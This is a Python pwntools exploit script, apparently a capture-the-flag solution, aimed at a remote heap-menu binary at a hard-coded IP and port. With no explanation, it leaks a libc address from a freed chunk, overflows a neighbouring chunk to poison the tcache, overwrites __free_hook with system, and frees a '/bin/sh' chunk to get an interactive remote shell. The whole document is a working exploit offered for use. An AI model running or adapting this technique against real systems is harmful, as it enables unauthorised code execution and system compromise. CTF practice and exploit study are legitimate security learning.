from pwn import *
def setup_env():
    context.terminal = ['alacritty', '-e', 'sh', '-c']
    context.update(arch='x86_64', os='linux', log_level='info')

setup_env()
remote_conn = remote('101.200.155.151', 12300)
libc_file = ELF('./attachment-23.so')
binary = ELF('./attachment-23')

def select_option(choice_num):
    remote_conn.sendlineafter('choice:\n', str(choice_num))
def create_chunk(slot, chunk_size):
    select_option(1)
    remote_conn.sendlineafter('index:\n', str(slot))
    remote_conn.sendlineafter('size:\n', str(chunk_size))
def remove_chunk(slot):
    select_option(2)
    remote_conn.sendlineafter('index:\n', str(slot))
def modify_chunk(slot, data_len, payload):
    select_option(3)
    remote_conn.sendlineafter('index:\n', str(slot))
    remote_conn.sendlineafter('length:\n', str(data_len))
    remote_conn.sendafter('content:\n', payload)
def display_chunk(slot):
    select_option(4)
    remote_conn.sendlineafter('index:\n', str(slot))

create_chunk(9, 0x420)  
create_chunk(8, 0x30)   
create_chunk(7, 0x20)    
create_chunk(6, 0x30)    
remove_chunk(9)
display_chunk(9)
leaked_addr = u64(remote_conn.recv(6).ljust(8, b'\x00'))
libc_base_addr = leaked_addr - 0x1ecbe0
sys_addr = libc_base_addr + libc_file.sym['system']
hook_addr = libc_base_addr + libc_file.sym['__free_hook']
remove_chunk(8)
remove_chunk(6)  
overflow_payload = flat({
    0x28: [0x41, hook_addr]
}, filler=b'X')
modify_chunk(7, 0x50, overflow_payload)
create_chunk(5, 0x30)  
create_chunk(4, 0x30)  
modify_chunk(4, 0x8, p64(sys_addr))
modify_chunk(5, 0x8, b'/bin/sh\0')
remove_chunk(5)
remote_conn.interactive()

